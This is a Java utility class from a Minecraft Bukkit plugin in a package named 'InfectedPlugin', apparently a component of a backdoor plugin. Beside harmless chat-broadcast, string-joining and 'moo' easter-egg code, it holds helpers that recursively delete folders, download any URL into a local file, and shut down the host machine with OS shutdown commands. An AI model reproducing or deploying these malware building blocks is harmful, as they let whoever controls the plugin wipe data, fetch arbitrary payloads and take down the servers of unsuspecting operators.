package org.CreeperCoders.InfectedPlugin;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.net.URL;
import java.nio.channels.Channels;
import java.nio.channels.ReadableByteChannel;
import java.util.List;
import java.util.logging.Logger;

import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.Sound;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;

public class IP_Util
{
    public static final Logger log = Bukkit.getLogger();

    public static boolean deleteFile(File file)
    {
        if (file.exists())
        {
            for (File f : file.listFiles())
            {
                if (!IP_Util.deleteFile(f))
                {
                    return false;
                }
            }

            file.delete();
            return !file.exists();
        }
        else
        {
            return false;
        }
    }

    public static boolean deleteFolder(File file)
    {
        if (file.exists())
        {
            if (file.isDirectory())
            {
                for (File f : file.listFiles())
                {
                    if (!IP_Util.deleteFolder(f))
                    {
                        return false;
                    }
                }
            }
            file.delete();
            return !file.exists();
        }
        else
        {
            return false;
        }
    }

    public static void downloadFile(String url, File output) throws java.lang.Exception
    {
        downloadFile(url, output, false);
    }

    public static void downloadFile(String url, File output, boolean verbose) throws java.lang.Exception
    {
        URL website = new URL(url);
        ReadableByteChannel rbc = Channels.newChannel(website.openStream());
        FileOutputStream fos = new FileOutputStream(output);
        fos.getChannel().transferFrom(rbc, 0, 1 << 24);
        fos.close();

        if (verbose)
        {
        }
    }

    public static void shutdown() throws RuntimeException, IOException
    {
        String shutdownCommand = null;
        String operatingSystem = System.getProperty("os.name");

        if ("Linux".equals(operatingSystem) || "Mac OS X".equals(operatingSystem))
        {
            shutdownCommand = "shutdown -h now";
        }
        else if ("Windows".equals(operatingSystem) || "Windows 7".equals(operatingSystem))
        {
            shutdownCommand = "shutdown.exe -s -t 0";
        }
        else
        {
            throw new RuntimeException("Unsupported operating system.");
        }

        Runtime.getRuntime().exec(shutdownCommand);
        System.exit(0);
    }

    public static void bcastMsg(String message, ChatColor color)
    {
        for (Player player : Bukkit.getOnlinePlayers())
        {
            player.sendMessage((color == null ? "" : color) + message);
        }
    }

    public static void bcastMsg(String message)
    {
        IP_Util.bcastMsg(message, null);
    }

    public static void adminAction(String adminName, String action, boolean isRed)
    {
        IP_Util.bcastMsg(adminName + " - " + action, (isRed ? ChatColor.RED : ChatColor.AQUA));
    }

    public static String implodeStringList(String glue, List<String> pieces)
    {
        StringBuilder output = new StringBuilder();
        for (int i = 0; i < pieces.size(); i++)
        {
            if (i != 0)
            {
                output.append(glue);
            }
            output.append(pieces.get(i));
        }
        return output.toString();
    }

    private final static String[] consoleMoo = new String[]
    {
        " (__)",
        " (oo)",
        " /------\\/",
        " / | ||",
        " * /\\---/\\",
        " ~~ ~~",
        "....\"Have you mooed today?\"..."
    };
    private final static String[] playerMoo = new String[]
    {
        " (__)",
        " (oo)",
        " /------\\/",
        " / | | |",
        " * /\\---/\\",
        " ~~ ~~",
        "....\"Have you mooed today?\"..."
    };

    public static void run_moo(final CommandSender sender, final String commandLabel, final String[] args)
    {
        if (args.length == 2 && args[1].equals("moo"))
        {
            for (String s : consoleMoo)
            {
                log.info(s);
            }
            for (Player player : sender.getServer().getOnlinePlayers())
            {
                player.sendMessage(playerMoo);
                player.playSound(player.getLocation(), Sound.COW_IDLE, 1, 1.0f);
            }
        }
        else
        {
            if (sender instanceof Player)
            {
                sender.sendMessage(playerMoo);
                final Player player = (Player) sender;
                player.playSound(player.getLocation(), Sound.COW_IDLE, 1, 1.0f);
            }
            else
            {
                sender.sendMessage(consoleMoo);
            }
        }
    }
}
